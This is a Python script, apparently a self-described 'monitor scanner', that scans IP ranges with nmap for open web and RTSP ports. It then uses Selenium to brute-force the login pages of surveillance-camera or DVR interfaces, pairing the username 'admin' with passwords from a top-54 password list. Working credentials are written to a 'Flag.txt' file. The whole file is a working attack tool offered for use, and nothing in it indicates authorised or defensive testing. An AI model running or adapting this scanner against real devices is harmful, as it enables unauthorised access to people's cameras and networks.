#-*-  coding:utf-8 -*-
#主要用来测试selenium使用phantomJs
from multiprocessing import Process
#导入webdriver
from selenium import webdriver
import time
from IPy import IP
import nmap


username = "admin"


def OpenChrome(url,password):
    #调用环境变量指定的Chrome浏览器创建浏览器对象
    driver = webdriver.Chrome(executable_path = "C:\\Users\\zyc\\PycharmProjects\\untitled\\chromedriver.exe")
    driver.set_window_size(1366, 768)


    #如果没有在环境变量指定PhantomJS位置
    #driver = webdriver.Chrome(executable_path = "./chromedriver.exe")
    #driver.get("http://www.baidu.com/")
    driver.set_page_load_timeout(120)
    driver.get(url)
    #html_text=driver.page_source
    #print(html_text)
    Simulated_Login(url, password,driver)

def Simulated_Login(url,password,driver):


    try:#判断是否是监控登陆页面

        #password="xmytl@123"
        # click()是模拟点击
        # 找到username和password的标签并提取出来
        a = driver.find_elements_by_tag_name("input")
        li = []
        for item in a:
            # item.get_attribute('outerHTML')
            item = item.get_attribute('id')
            if len(item) != 0 & len(item) < 11:
                li.append(item)

        driver.find_element_by_id(li[0]).clear()
        driver.find_element_by_id(li[0]).send_keys(username)
        driver.find_element_by_id(li[1]).clear()
        driver.find_element_by_id(li[1]).send_keys(password)
        LandingWindow(driver,url,password)
    except Exception:

        driver.quit()
        return 0


def LandingWindow(driver,url,password):



    try:#判断点击窗口名字（后期有多的版本可以这边添加）
        driver.find_element_by_class_name("loginbtn").click()
        print('2222222222')
    except Exception as e:
        print('错误2' + repr(e))
        driver.find_element_by_class_name("login-btn").click()

    time.sleep(2)

    # try:  # 判断JS弹窗是否有特殊形式
    #     element = driver.switch_to_alert()
    #     element.dismiss()
    #     LoadPassword(driver, url, password)
    # except BaseException:
    LoadPassword(driver,url,password)



def LoadPassword(driver,url,password):

    try:
        element = driver.switch_to_alert()
        #万能的dismiss 既可以点取消也可以点确定
        element.dismiss()
        print(element.text)
        if element.text == "用户名或密码不正确" or element.text == "User name or password is incorrect. Please enter again.":
            f = open("E:\\error.txt", "a+", encoding='utf8')
            f.write(url + "\n")
            f.close()
            driver.quit()
            return 1
        else:
            driver.quit()
            f = open("E:\\Flag.txt", "a+", encoding='utf8')
            f.write(url + "\n")
            f.write("账号:" + username + "\n")
            f.write("密码:" + password + "\n")
            f.close()
            return 0

    except BaseException:#判断是否是文本内容
        element = driver.find_element_by_class_name("ng-binding")
        print(element.text)
        if element.text=="用户名或密码不正确" or element.text=="User name or password is incorrect. Please enter again.":
            f = open("E:\\error.txt", "a+", encoding='utf8')
            f.write(url + "\n")
            f.close()
            driver.quit()
            return 1
        else:
            driver.quit()
            f = open("E:\\Flag.txt", "a+",encoding='utf8')
            f.write(url + "\n")
            f.write("账号:"+username + "\n")
            f.write("密码:"+password + "\n")
            f.close()
            return 0





def PWord(url):
    url = "http://" + url
    print("正在测试:"+url)
    file = open("E:\\pwdTop54.txt", "r", encoding='utf8')
    for line in file.readlines():
        password = line.strip()
        FanHui=OpenChrome(url,password)
        if FanHui==0:
            break
        if FanHui==1:
            print("11111111111111111111111111111")
    pass




        #print(password)


if __name__ == '__main__':
    print('''            .                   						    
           MB@r                							    
          @J.0@BY               					        
         S0.. v@B@v             							
        .B:.:. :@B@Br             					        
        SF . ..:5@M@BXi:.        						    
        @. r0@@BMB@@@B@B@B@X7.     						    
       :8rB@2      uB@B@B@B@@@BL        				    
       :@BJ  .FOM1   M@MMMBM@B@B@M@BMNUi.                   
       @B,  O@B@B@B: ,B@M@@@B@B@B@8@B@@@B@BEr.              
      BB7  M@BMMMB@N  BB@BOv: :vMB@GS;77vLuuGB:             
     LBM   @BMOMM@Br  B@F        .M@O. . .  ZL              
     M@5   @@@@B@BF  J@:  rB@B@B.  M@2 ,,.rB7               
     @@@   ,B@@@O:  :@r  MB@@@B@B  7@8..:qO,                
     7@B0     .    :@Z  uB@MMOBB@  i@P.LMv                  
      O@B@7      ,P@B,  E@BMMBB@F  SBOkU                    
       8@B@BB0qZBB@B@i  iB@B@B@2  ,B@r                      
        L@B@B@B@Gi71OM   ,q@Mu   ,B@:                       
          jB@BBBE..:NBB,        jB@r                        
            LZO@Nrq@B@B@Mu:..;S@BB.                         
           :MBMMMB@MMB@B@B@B@B@Z:                           
          r@BBOMOMMOq7rSPEP57,                              
         ,@BBOMOMOMM@i                                      
         OB@OMOMOMOMB@i                                     
        :B@MMOMOMOMOB@@:         .           
        L@BMOMOMOMOMO@@MB@B@BOXNB@B:         
        iB@B@B@BBM@B@@@G@@@B@@@@@B@:                        
         r0BB@B@@@B@B@MMONXMB@B@Bq.                         
		 
Welcome to monitor scanner developed by Ascotb''')
    print('1.测试单个IP\n2.测试IP段(192.168.1.1/24)\n3.从文本中加载IP')
    choose=input("输入选项:")
    choose=int(choose)
    if choose==1:
        x=input('请输入IP:')
        PWord(x)
    elif choose==2:
        ips = input('请输入扫描的IP端:')
        ip=IP(ips)
        a=ip.len()
        print('需要扫描IP地址数量为:'+str(a))

        for x in ip:
            x=str(x)
            nm = nmap.PortScanner()
            # 扫描的值
            nm = nm.scan(x, '80,554,8000,88,123,445')
            try:
                # 获取端口是否开放
                a1 = nm['scan'][x]['tcp'][554]['state']
                a2 = nm['scan'][x]['tcp'][8000]['state']
                a3 = nm['scan'][x]['tcp'][80]['state']
                a4 = nm['scan'][x]['tcp'][88]['state']
                a5 = nm['scan'][x]['tcp'][123]['state']
                a6 = nm['scan'][x]['tcp'][445]['state']
                if a1=='open':
                    x1=x + ':554'
                    PWord(x1)
                if a2=='open':
                    x2=x+':8000'
                    PWord(x2)
                if a3=='open':
                    x3=x+':80'
                    PWord(x3)
                if a4=='open':
                    x4=x+':88'
                    PWord(x4)
                if a5=='open':
                    x5=x+':123'
                    PWord(x5)
                if a6=='open':
                    x6=x+':445'
                    PWord(x6)
            except KeyError:
                print(x+'无网络连接跳过！')
                pass

    elif choose==3:
        text=input('输入打开文本的地址:')
        file = open(text, "r", encoding='utf8')
        for line in file.readlines():
            x = line.strip()
            print(x)
            PWord(x)



#     p1=Process(target=IPS,args=(1,10,))
#     p2=Process(target=IPS,args=(11,20,))
#     p3=Process(target=IPS,args=(21,30,))
#     p4=Process(target=IPS,args=(31,40,))
#     p5=Process(target=IPS,args=(41,50,))
#     p6=Process(target=IPS,args=(51,60,))
#     p7=Process(target=IPS,args=(61,70,))
#     p8=Process(target=IPS,args=(71,80,))
#     p9=Process(target=IPS,args=(81,90,))
#     p10=Process(target=IPS,args=(91,100,))
#     p11=Process(target=IPS,args=(101,110,))
#     p12=Process(target=IPS,args=(111,120,))
#     p13=Process(target=IPS,args=(121,130,))
#     p14=Process(target=IPS,args=(131,140,))
#     p15=Process(target=IPS,args=(141,150,))
#     p16=Process(target=IPS,args=(151,160,))
#     p17=Process(target=IPS,args=(161,170,))
#     p18=Process(target=IPS,args=(171,180,))
#     p19=Process(target=IPS,args=(181,190,))
#     p20=Process(target=IPS,args=(191,200,))
#     p21=Process(target=IPS,args=(201,210,))
#     p22=Process(target=IPS,args=(211,220,))
#     p23=Process(target=IPS,args=(221,230,))
#     p24=Process(target=IPS,args=(231,240,))
#     p25=Process(target=IPS,args=(241,250,))
#     p26=Process(target=IPS,args=(251,256,))
#     p1.start()
#     p2.start()
#     p3.start()
#     p4.start()
#     p5.start()
#     p6.start()
#     p7.start()
#     p8.start()
#     p9.start()
#     p10.start()
#     p11.start()
#     p12.start()
#     p13.start()
#     p14.start()
#     p15.start()
#     p16.start()
#     p17.start()
#     p18.start()
#     p19.start()
#     p20.start()
#     p21.start()
#     p22.start()
#     p23.start()
#     p24.start()
#     p25.start()
#     p26.start()
